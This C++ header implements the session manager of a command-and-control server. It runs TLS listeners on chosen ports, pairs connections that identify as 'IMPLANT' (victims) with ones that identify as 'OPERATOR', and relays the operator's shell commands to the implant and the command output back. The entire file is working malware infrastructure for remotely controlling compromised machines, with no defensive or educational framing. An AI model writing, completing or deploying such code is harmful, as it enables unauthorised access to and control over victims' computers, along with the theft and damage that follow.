#pragma once

#include "Logger.hpp"
#include "Config.hpp"

#include <Remote.hpp>
#include <Server.hpp>
#include <chrono>
#include <cstdint>
#include <map>
#include <memory>
#include <string>
#include <thread>
#include <mutex>

//--------------------------------
//
//--------------------------------
class SessionManager {
private:

    SessionManager() = default;
    ~SessionManager() = default;
    SessionManager(const SessionManager&) = delete;
    SessionManager& operator=(const SessionManager&) = delete;

    std::map<uint16_t, std::jthread> listeners;
    std::mutex mtx;
    std::map<int64_t, std::unique_ptr<cpppwn::Remote>> waiting_operators;
    std::map<int64_t, std::unique_ptr<cpppwn::Remote>> waiting_victims;

public:
    //--------------------------------
    //
    //--------------------------------
    static SessionManager& instance() {
        static SessionManager instance;
        return instance;
    }

    //--------------------------------
    //
    //--------------------------------
    bool start_listener(uint16_t port) {
        std::lock_guard lock(mtx);
        if (listeners.contains(port)) return false;
        auto& config = Config::instance("server.db");

        listeners[port] = std::jthread([this, port, &config](std::stop_token stoken) {
            cpppwn::TlsConfig tls_conf{
                config.get<std::string>("victim_cert"),
                config.get<std::string>("victim_key")
            };
            cpppwn::Server server(port, tls_conf);

            while (not stoken.stop_requested()) {
                auto conn = server.accept();
                this->handle_new_connection(std::move(conn), port);
            }
        });
        return true;
    }

    //--------------------------------
    //
    //--------------------------------
    void handle_new_connection(std::unique_ptr<cpppwn::Remote>&& conn, int64_t port) {
        std::thread([this, conn_ptr = std::move(conn), port]() mutable -> void {
            try {
                std::string ident = conn_ptr->recvline();
                if (ident.empty()) return;

                std::lock_guard lock(mtx);

                if (ident.starts_with("IMPLANT")) {
                    if (waiting_operators.contains(port)) {
                        bridge_sockets(std::move(conn_ptr), std::move(waiting_operators[port]));
                        waiting_operators.erase(port);
                    } else {
                        waiting_victims[port] = std::move(conn_ptr);
                        logger::info("Implant linked to Port: {}", port);
                    }
                } else if (ident.starts_with("OPERATOR")) {
                    if (waiting_victims.contains(port)) {
                        bridge_sockets(std::move(waiting_victims[port]), std::move(conn_ptr));
                        waiting_victims.erase(port);
                    } else {
                        waiting_operators[port] = std::move(conn_ptr);
                        logger::info("Operator waiting for Victim on Port: {}", port);
                    }
                }
            } catch (const std::exception& e) {
                logger::warn("Connection handler failed: {}", e.what());
            }
        }).detach();
    }

    //--------------------------------
    //
    //--------------------------------
    void bridge_sockets(std::unique_ptr<cpppwn::Remote>&& a_ptr, std::unique_ptr<cpppwn::Remote>&& b_ptr) {
        std::thread([vic = std::move(a_ptr), op = std::move(b_ptr)]() -> void {
            logger::success("Bridging established between Implant and Operator.");

            while (vic->is_alive() && op->is_alive()) {
                const auto cmd = trim_string(op->recvline());
                logger::debug("Shell Command From Operator: [{}]", cmd);
                vic->sendline(cmd);

                const auto output_size = std::atol(trim_string(vic->recvline()).c_str());
                logger::debug("Output Size: [{}]", output_size);

                if (output_size > 0) {
                    const auto output = trim_string(vic->recv(output_size));
                    logger::debug("Output from Victim: [{}]", output);
                    op->sendline(output + "_MLVX_END");
                } else {
                    op->sendline("MLVX_NODATA_MLVX_END");
                }

                std::this_thread::sleep_for(std::chrono::milliseconds(5));
            }
            logger::warn("Bridge closed: One or both parties disconnected.");
        }).detach();
    }

    //--------------------------------
    //
    //--------------------------------
    void stop_listener(uint16_t port) {
        std::lock_guard lock(mtx);
        listeners.erase(port); // jthread cleans itself up
    }
};